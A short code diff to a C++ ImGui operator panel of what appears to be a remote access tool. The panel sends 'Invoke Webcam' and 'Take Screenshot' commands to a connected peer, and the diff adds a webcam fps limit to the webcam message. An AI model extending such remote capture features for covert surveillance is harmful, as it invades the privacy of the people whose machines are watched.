@@ -399,6 +399,7 @@ void RunGui() {
                     msg.commandNumber = MessageInvokeWebcam;
                     json jsonData;
                     jsonData["millisecond"] = client.funcStruct.webcamDurationMs;
+                    jsonData["fps"] = client.funcStruct.webcamFps;
                     msg.setJsonData(jsonData);
                     if (client.sendData(msg)) {
                         miniConsole.AddLineSuccess("Invoke Webcam Message sent to %s", client.getPeerIpPort().c_str());
@@ -407,9 +408,15 @@ void RunGui() {
                     }
                 }).detach();
             }
+            ImGui::SetNextItemWidth(150.0f);
             if(ImGui::InputInt("Invoke webcam duration (in millisecond)", &client.funcStruct.webcamDurationMs)) {
                 if(client.funcStruct.webcamDurationMs < 1000) client.funcStruct.webcamDurationMs = 1000;
                 if(client.funcStruct.webcamDurationMs > 2000000000) client.funcStruct.webcamDurationMs = 2000000000;
+            }
+            ImGui::SetNextItemWidth(150.0f);
+            if(ImGui::InputInt("Invoke webcam fps limit", &client.funcStruct.webcamFps)) {
+                if(client.funcStruct.webcamFps < 0) client.funcStruct.webcamFps = 10;
+                if(client.funcStruct.webcamFps > 500) client.funcStruct.webcamFps = 500;
             }
 
             if(ImGui::Button(client.makeWidgetName("Take Screenshot").c_str())) {
